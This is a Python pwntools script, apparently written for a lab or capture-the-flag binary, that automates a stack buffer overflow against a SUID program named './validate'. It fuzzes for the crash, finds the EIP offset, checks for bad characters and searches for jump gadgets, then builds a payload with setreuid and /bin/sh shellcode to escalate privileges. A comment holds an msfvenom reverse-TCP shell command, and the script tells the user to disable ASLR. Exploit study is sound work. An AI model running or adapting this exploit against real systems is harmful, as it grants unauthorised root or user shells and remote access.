#!/usr/bin/env python3
#2025-02-03

#***IMPORTANT***
#For this to work you need to turn off ASLR on the machine where it's run
#
#sudo su
#echo 0 > /proc/sys/kernel/randomize_va_space
#
#cat /proc/sys/kernel/randomize_va_space
#The last command should return 0


from pwn import *
import subprocess
import os

context.log_level = 'critical'
context.delete_corefiles = True

executable = "./validate"
suid_user_id = 1001 #the user that owns the suid binary
initial_bad_chars = "\x00F" #initial bad chars, null and possible characters from reading the programs code

fuzz_step = 10

#-----------------------------------------------------------------------------------
#Prevent that appears when exiting when using context.delete_corefiles = True
_original_unlink = os.unlink
def safe_unlink(path, *args, **kwargs):
    if path.startswith("core."):  # Only ignore core dump deletions
        try:
            _original_unlink(path, *args, **kwargs)
        except FileNotFoundError:
            pass
    else:
        _original_unlink(path, *args, **kwargs)
os.unlink = safe_unlink

#-----------------------------------------------------------------------------------
e = ELF(executable)
context.binary = e
address_length = context.bits//8

r2_path = "/usr/bin/r2"
r2_arguments = "-d"

#-----------------------------------------------------------------------------------
print("\nRunning executable with increasing size arguments")
length = 0
while True:
  #print(".",end="")
  length += fuzz_step
  p = subprocess.run([executable, "A"*length])
  if not p.returncode == 0:
    print("Program crashed at "+str(length))
    crash_length = length
    break

#-----------------------------------------------------------------------------------
print("\nGenerating non repeating string")
cyclic_string = cyclic(crash_length)
print(cyclic_string)

#-----------------------------------------------------------------------------------
print("\nRunning executable in r2 with the generated string")
p = process([r2_path, r2_arguments, executable, cyclic_string])

p.sendline(b'dc\n') #put the command to start running the program in the buffer
while True:
  received_line = p.recvlineS().strip()
  if 'SIGNAL 11' in received_line:
    print("Buffer overflow: "+received_line)
    pos = received_line.find("addr=")
    crash_address_string = int(received_line[pos+5:][:10],0)
    print("Crash address string: %#x" % crash_address_string)
    break
p.sendline(b'q\n') #quitting r2

#-----------------------------------------------------------------------------------
print("\nFinding eip position using r2 output of crash address")
space_before_eip = cyclic_find(crash_address_string)
print("EIP position: "+str(space_before_eip))

#-----------------------------------------------------------------------------------
print("\nConfirming EIP position")

argument = b'a'*space_before_eip+b"B"*address_length
p = process([r2_path, r2_arguments, executable, argument])

p.sendline(b'dc\n') #put the command to start running the program in the buffer
while True:
  received_line = p.recvlineS().strip()
  if 'SIGNAL 11' in received_line:
    pos = received_line.find("addr=")
    crash_address_string = received_line[pos+5:][:10]
    print("Crash address string: "+crash_address_string)
    break
p.sendline(b'q\n') #quitting r2
if crash_address_string == "0x42424242":
  print("Confirmed!")
else:
  print("Failed! Exiting script! Please check the code.")
  exit()

#-----------------------------------------------------------------------------------
print("\nGenerating shellcode for a SUID binary - for user id "+str(suid_user_id))
shellcode_assempler_code = shellcraft.i386.linux.setreuid(str(suid_user_id))+shellcraft.i386.linux.sh()
#print(shellcode_assempler_code) # outputs assembler code
shellcode = asm(shellcode_assempler_code) # generates machine code in bytes format
print("Shellcode: "+(''.join(f'\\x{byte:02x}' for byte in shellcode)))
print("Shellcode length: "+str(len(shellcode))+" bytes")

#-----------------------------------------------------------------------------------
print("\nTesting for bad characters")
all_chars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
bad_chars = initial_bad_chars

found_all_bad_chars = False
while not found_all_bad_chars:
  chars_to_check = bytes("".join(c for c in all_chars if c not in bad_chars), "latin-1") # Remove bad_chars from all_chars and convert to bytes
  argument = b'A'*space_before_eip+b"B"*address_length+chars_to_check

  p = process([executable, argument]) #run the program with the argument
  p.wait() #wait until the program crashes

  stack_data_eax = p.corefile.read(p.corefile.eax, len(argument))
  print("stack_data_eax:")
  #print(''.join(f'\\x{byte:02x}' for byte in stack_data_eax))
  print("\\x"+stack_data_eax.hex(" ").replace(" ","\\x"))

  #from the coredump, get the data from the sp (stack pointer) for length of chars_to_check characters
  stack_data = p.corefile.read(p.corefile.sp, len(chars_to_check))
  print("stack_data:")
  print(stack_data)

  for i in range(len(chars_to_check)):
    #print("index: "+str(i)+", string: "+str(chars_to_check[i])+", stack: "+str(stack_data[i]))
    if not chars_to_check[i] == stack_data[i]: # Compare expected vs. actual data
      print("New bad character: %#x" % chars_to_check[i])
      bad_chars += chr(chars_to_check[i])
      print("Current bad character list: "+(''.join(f'\\x{byte:02x}' for byte in bytes(bad_chars,"latin-1"))))
      break
    if i == len(chars_to_check)-1:
      print("Just checked the last char and it was ok")
      found_all_bad_chars = True

#We could replace this bad chars test with one that replaces the first 'A'
#with one character at a time that we want to test - If it doesn't bof or if
#the character is not in the bof crash corefile, then we have a bad character

print("Bad chars: "+(''.join(f'\\x{byte:02x}' for byte in bytes(bad_chars,"latin-1"))))

#-----------------------------------------------------------------------------------
print("\nEncoding shellcode to avoid bad characters")
encoded_shellcode = encode(shellcode, avoid=bytes(bad_chars,"latin-1"))

print("Encoded shellcode: "+(''.join(f'\\x{byte:02x}' for byte in encoded_shellcode)))
print("New shellcode length: "+str(len(encoded_shellcode))+" bytes")
encoded_shellcode = (''.join(f'\\x{byte:02x}' for byte in encoded_shellcode))

#-----------------------------------------------------------------------------------
print("\nLooking for useful jmp and call instructions")
registers = ["esp", "eax"]
instructions = ["jmp ^", "call ^", "push ^; ret"]
found_address = False

jmp_address = next(e.search(asm("call eax")))

for register in registers:
  for instruction in instructions:
    search_thingy = instruction.replace("^",register)
    try:
      jmp_address = next(e.search(asm(search_thingy)))
    except StopIteration as e:
      print("'"+search_thingy+"' not found")
    else: #try finished without failing
      found_address = True
      break
    finally:
      e = ELF(executable)
  if found_address: break

if found_address:
  print(f"'{search_thingy}' found at: {hex(jmp_address)}")
  stack_data_jpm_code = p.corefile.read(jmp_address-4, 8)
  print(disasm(stack_data_jpm_code))
  address = jmp_address.to_bytes(address_length, "little") #Convert int to little-endian

else:
  print("Falling back to sp")
  #if none of these work = just put p.corefile.sp as the address
  #needs to be using 32 or 64 bits depending or ^
  print("\nSP address: "+hex(p.corefile.sp))
  address = int(p.corefile.sp).to_bytes(address_length, "little")

address = ''.join(f'\\x{byte:02x}' for byte in address)

print("\nAddress to put in EIP: "+address)

#-----------------------------------------------------------------------------------
print("\nGenerating the full payload")

def generate_shellcode_msfvenom():
  #msfvenom --payload 'linux/x86/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=444 --format 'python' --bad-chars '\x00\x0a'
  #msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x46' -e x86/shikata_ga_nai -f raw 2> /dev/null
  command = "msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x46' -e x86/shikata_ga_nai -f raw 2> /dev/null"
  command = command.split(" ")
  #print(command)
  print("Running msfvenom - This will take a few seconds")
  p = process(['msfvenom', '-a', 'x86', '-p', 'linux/x86/exec', 'CMD=/bin/sh', '-b', "'\\x00F'", '-e', 'x86/shikata_ga_nai', '-f', 'raw'],stderr=open("/dev/null", "wb"))
  received_data = p.recvall()
  print("data: "+str(len(received_data))+"\n")
  return received_data

payload = executable+" $(python -c \"print("

if found_address and register == "esp":
  #shellcode need to start after eip position
  fill_to_eip = "'A'*"+str(space_before_eip)
  payload += fill_to_eip + "+'" + address+ "'+'" + encoded_shellcode + "'"

elif register == "eax" and space_before_eip-len(encoded_shellcode) >= 0:
  #shellcode need to start at the start of the string
  fill_to_eip = "'A'*"+str(space_before_eip-len(encoded_shellcode))
  payload += "'" + encoded_shellcode + "'+" + fill_to_eip + "+'" + address+"'"

elif register == "eax" and space_before_eip-len(encoded_shellcode) < 0:
  encoded_shellcode = generate_shellcode_msfvenom()
  if space_before_eip-len(encoded_shellcode) < 0:
    print("space_before_eip-len(encoded_shellcode) < 0 - The shellcode won't fit!")
    exit()
  fill_to_eip = "'A'*"+str(space_before_eip-len(encoded_shellcode))
  encoded_shellcode = ''.join(f'\\x{byte:02x}' for byte in encoded_shellcode)
  payload += "'" + encoded_shellcode +"'+"+ fill_to_eip + "+'" + address+"'"

else:
  payload += "'A'*"+str(space_before_eip)+"+'"+address+"'+'"+encoded_shellcode+"'"

payload += ")\")"

print(payload)

#-----------------------------------------------------------------------------------
print("\nChecking if ASLR is turned off",end="")
p = process(["cat","/proc/sys/kernel/randomize_va_space"])
received_line = p.recvlineS().strip()
if not '0' in received_line:
  print("\n\nASLR is ON!\n")
  print("For this script to find the right address you need to turn off ASLR!!!\n")
  print("sudo su")
  print("echo 0 > /proc/sys/kernel/randomize_va_space\n")
else:
  print(" - ASLR is OFF!\n")
  print("Don't forget to turn ASLR back on or reboot when you're done!")
